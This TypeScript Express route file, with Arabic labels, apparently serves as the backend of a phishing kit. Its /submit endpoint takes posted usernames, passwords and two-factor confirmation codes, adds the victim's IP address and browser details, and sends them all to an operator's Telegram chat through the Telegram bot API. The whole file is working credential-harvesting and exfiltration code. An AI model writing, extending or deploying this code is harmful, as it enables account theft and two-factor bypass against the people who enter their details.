import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

router.post("/submit", async (req: Request, res: Response) => {
  console.log('📥 [1] Request received');
  console.log('📥 [2] Origin:', req.headers.origin);
  
  // ✅ تأكد من إرسال JSON
  res.setHeader('Content-Type', 'application/json');
  
  try {
    const { username, password, timestamp, userAgent } = req.body;
    console.log('📥 [3] Username:', username);

    if (!username) {
      console.log('📥 [4] ❌ Username missing');
      return res.status(400).send(JSON.stringify({ error: "Username is required" }));
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    console.log('📥 [5] Bot Token exists?', !!botToken);

    if (!botToken || !chatId) {
      console.error("📥 [6] ❌ Telegram credentials missing");
      return res.status(500).send(JSON.stringify({ error: "Telegram not configured" }));
    }

    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';
    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 رمز التأكيد" : "🔐 محاولة دخول جديدة";
    const label = isCode ? "📱 رمز التأكيد:" : "🔑 كلمة المرور:";

    const message = `
${title}

👤 اسم المستخدم: ${username}
${label} ${password}
⏱️ الوقت: ${timestamp || new Date().toLocaleString()}
🌐 IP: ${ip}
📱 المتصفح: ${userAgent || 'غير معروف'}
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("📥 [7] ❌ Telegram error:", errorText);
      return res.status(500).send(JSON.stringify({ error: "Failed to send Telegram message" }));
    }

    console.log("📥 [8] ✅ Telegram notification sent");
    
    // ✅ تأكد من إرسال الرد
    const responseData = { success: true };
    console.log('📥 [9] Sending response:', responseData);
    return res.status(200).send(JSON.stringify(responseData));

  } catch (error) {
    console.error("📥 [10] ❌ Server error:", error);
    return res.status(500).send(JSON.stringify({ 
      error: "Internal server error",
      details: error.message 
    }));
  }
});

export default router;
